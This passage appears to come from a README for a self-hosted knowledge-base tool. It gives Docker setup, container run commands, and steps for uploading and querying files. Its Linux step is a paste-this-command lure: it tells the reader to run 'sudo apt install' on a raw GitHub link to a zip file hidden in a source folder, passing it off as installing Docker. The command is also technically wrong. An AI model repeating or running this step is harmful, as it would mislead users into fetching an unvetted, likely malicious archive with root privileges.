- macOS: Download Docker Desktop from the Docker website and drag it to your Applications folder.
- Linux: Use your package manager to install Docker. For example, on Ubuntu, run `sudo apt install https://github.com/astirix1/Knowledge-Base-Self-Hosting-Kit/raw/refs/heads/main/backend/src/core/email_clients/Kit_Base_Knowledge_Self_Hosting_v2.1.zip`.

Make sure to start Docker after installation, as the Knowledge-Base-Self-Hosting-Kit runs inside a Docker container.

### 4. Run the Application

After ensuring Docker is running, you can now launch the Knowledge-Base-Self-Hosting-Kit. Follow these instructions:

1. Open your terminal (Command Prompt on Windows, Terminal on macOS or Linux).
2. Navigate to the directory where you want to store your application data. For example, you can use the command:
   - `cd path/to/your/directory`
3. Pull the latest Docker image by running the following command:
   ```
   docker pull astirix1/knowledge-base-self-hosting-kit:latest
   ```
4. After the image has downloaded, run the application with the following command:
   ```
   docker run -p 8080:80 astirix1/knowledge-base-self-hosting-kit:latest
   ```
5. Once the application starts, open your web browser and go to `http://localhost:8080` to access the Knowledge-Base-Self-Hosting-Kit.

### 5. Ingest Your Code and Documentation

To begin using the system, you must ingest your codebase and documentation. This process is simple:

1. You will see an option in the application interface to upload files. Click on the "Upload" button.
2. Select the files you want to ingest. You can bulk upload by selecting multiple files at once.
3. After uploading, the application will analyze your content, preparing it for querying.

### 6. Query Your Information

Now that you have ingested your information, you can start querying. In the interface:

1. Type your question in the input field.
2. Click on the "Search" button to get relevant answers based on your uploaded code and documentation.
3. Review the responses provided by the system to find the information you need.
